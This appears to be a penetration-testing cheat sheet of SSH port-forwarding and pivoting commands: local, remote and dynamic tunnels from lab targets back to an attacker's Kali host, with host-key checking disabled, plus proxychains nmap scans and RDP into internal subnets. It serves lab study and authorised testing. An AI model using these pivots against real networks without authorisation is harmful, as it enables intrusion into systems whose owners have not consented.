# SSH

### Local Port Forwarding

```bash
ssh -f -N -L 2049:127.0.0.1:2049 megan@10.1.1.27
# -f: run as background
# -N: not to execute any command after connecting to the target
# -L: local port fowarding settings <Local port>:<remote host>:<remote port>	
ssh -L 8888:127.0.0.1:8080 aeolus@192.168.142.213
```

### Remote Port Forwarding

{% code overflow="wrap" %}
```bash
# @Kali (192.168.119.128) 
sudo systemctl start ssh

# @Target (10.1.1.200 and 10.5.5.200)
ssh -f -N -R 1122:10.5.5.11:22 -R 13306:10.5.5.11:3306 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i /tmp/k/id_rsa iptracej@192.168.119.128
# -f: run as background
# -N: not to execute any command after connecting to the target
# -R: remote port fowarding settings <Remote port>:<Target host>:<Target port>
# -o: This effectively disables host key checking, which can be a security risk
# -i: the location of the private key file to be used for authentication
```
{% endcode %}

### Remote Dynamic Port Forwarding and Double Pivoting

{% code overflow="wrap" %}
```bash
# @Kali
sudo systemctl start ssh

# @Initial hop (10.1.1.200 and 10.5.5.200)
ssh -vvv -f -N -R 1080 -F /dev/null iptracej@192.168.119.128

# @Kali (192.168.119.128) 
vi etc/proxychains.conf
# Add the following
# socks4 127.0.0.1 1080

proxychains nmap --top-ports=20 -sT -Pn 10.5.5.20
proxychains xfreerdp /d:sandbox /u:alex /v:10.5.5.20 +clipboard

# @Second hop (10.5.5.20 and 10.3.3.200) 
ssh -vvv -f -N -R 1085 -F /dev/null iptracej@192.168.119.128

# @Kali
vi etc/proxychains.conf
# Add the following
# socks4 127.0.0.1 1080
# socks4 127.0.0.1 1085

proxychains nmap --top-ports=20 -sT -Pn 10.3.3.38
```
{% endcode %}

### Local Dynamic Port Forwarding and Double Pivoting

{% code overflow="wrap" %}
```bash
# @Kali
# For 192.168.1.0/24 subnet connection at 10.11.0.128 host
sudo ssh -N -D 127.0.0.1:8080 student@10.11.0.128
vi etc/proxychains.conf
# Add the following
# socks4 127.0.0.1 8080

sudo proxychains nmap --top-ports=20 -sT -Pn 192.168.1.110

# Another example

# @Kali
# For 10.1.1.0/24 subnet connection via 10.11.1.251 host
ssh -f -N -D 127.0.0.1:9050 sean@10.11.1.251
vi etc/proxychains.conf
# Add the following
# socks4 127.0.0.1 8080
# socks4 127.0.0.1 9050

# For 10.3.3.0/24 subnet connection at 10.1.1.1 host
proxychains ssh -f -N -D 127.0.0.1:9055 root@10.1.1.1 -p 222
# Add the following
# socks4 127.0.0.1 8080
# socks4 127.0.0.1 9050
# socks4 127.0.0.1 9055

sudo proxychains nmap --top-ports=20 -sT -Pn 10.3.3.88
```
{% endcode %}
